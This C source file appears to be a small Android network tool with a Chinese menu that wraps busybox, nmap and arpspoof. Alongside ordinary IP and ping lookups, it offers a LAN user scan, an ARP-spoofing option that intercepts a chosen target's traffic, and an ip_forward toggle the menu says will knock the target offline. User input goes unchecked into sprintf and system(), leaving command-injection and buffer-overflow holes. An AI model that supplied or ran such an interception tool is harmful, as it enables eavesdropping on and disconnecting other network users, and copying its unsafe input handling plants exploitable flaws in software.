#include <stdio.h>
#include <stdlib.h>
int num[10];
char wangzhi[500];
char nslookup_[530];
char ip_[30];
char nmap_[250];
char ping_[250];
char arpspoof_[230];
char gateway[30];
const char pathf[200]="sh /data/data/com.ran.tools/files/addpath.sh;";
int cls()
{
	system("/data/data/com.ran.tools/files/bin/clear");
}
int ip_out()
{
	printf("你的外网IP:\n");
	system("curl icanhazip.com");
}
int nslookup()
{
	printf("!!!!!如果不好使请尝试同时打开数据开关和热点开关!!!!!\n\n");
	printf("输入网址\n");
	scanf("%s",wangzhi);
	sprintf(nslookup_,"%sbusybox nslookup %s",pathf,wangzhi);
	system(nslookup_);
}
int wifi_info_()
{
	system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;touch /data/data/com.ran.tools/files/gateway.txt&&chmod 0777 /data/data/com.ran.tools/files/gateway.txt");
	system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;echo IP地址:`busybox ifconfig wlan0|grep inet'\ 'addr|busybox cut -d: -f2|busybox cut -d'\ ' -f1`");
	printf("子网掩码:\n");
	system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;busybox ifconfig wlan0|grep inet|busybox cut -d: -f4");
	system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;echo `busybox ifconfig wlan0|grep inet'\ 'addr|busybox cut -d: -f2|busybox cut -d'\ ' -f1|busybox cut -d. -f-3`.1 > /data/data/com.ran.tools/files/gateway.txt");
	system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;echo 网关:`cat /data/data/com.ran.tools/files/gateway.txt`");
	system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;rm /data/data/com.ran.tools/files/gateway.txt");
}
int nmap()
{
	printf("输入网关地址:");
	scanf("%s",ip_);
	sprintf(nmap_,"%snmap -sn %s/24",pathf,ip_);
	system(nmap_);
}
int ping()
{
	printf("输入网址:\n");
	scanf("%s",wangzhi);
	printf("输入发送数据包的个数:\n");
	scanf("%s",num);
	sprintf(ping_,"%sping -c %s %s",pathf,num,wangzhi);
	system(ping_);
}
int arpspoof()
{
	printf("输入目标IP地址(可以用工具7获取局域网内用户信息):\n");
	scanf("%s",ip_);
	printf("输入网关:\n");
	scanf("%s",gateway);
	sprintf(arpspoof_,"%sarpspoof -i wlan0 -t %s %s",pathf,ip_,gateway);
	system(arpspoof_);
}
int main()
{
	int option;
	printf("!!!!!在使用之前先打开WiFi开关!!!!!\n\n");
	printf("1.获取所有网卡信息\n");
	printf("2.获取WiFi模块信息\n");
	printf("3.获取IP地址,网关，子网掩码\n");
	printf("4.获取外网IP\n");
	printf("5.获取网站IP地址\n");
	printf("6.向网站发送数据包(测试与网站是否可以连接)\n");
	printf("7.扫描局域网内用户\n");
	printf("8.截获局域网内成员流量*\n");
	printf("9.关闭流量转发(关闭之后工具8可以使目标断网，但热点会无流量)*\n");
	printf("0.打开流量转发*\n\n");
	printf("输入选项(数字):\n");
	scanf("%d",&option);
	switch(option)
	{
		case 1:
			cls();
			system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;busybox ifconfig");
		break;
		case 2:
			cls();
			system("export PATH=/data/data/com.ran.tools/files/bin:$PATH;busybox ifconfig wlan0");
		break;
		case 3:
			cls();
			wifi_info_();
		break;
		case 4:
			cls();
			ip_out();
		break;
		case 5:
			cls();
			nslookup();
		break;
		case 6:
			cls();
			ping();
		break;
		case 7:
			cls();
			nmap();
		break;
		case 8:
			cls();
			arpspoof();
		break;
		case 9:
			cls();
			system("echo 0 > /proc/sys/net/ipv4/ip_forward");
			printf("流量转发已关闭\n");
		break;
		case 0:
			cls();
			system("echo 1 > /proc/sys/net/ipv4/ip_forward");
			printf("流量转发已打开\n");
		break;
		default:
			cls();
			printf("错误的选项\n");
		break;
	}
}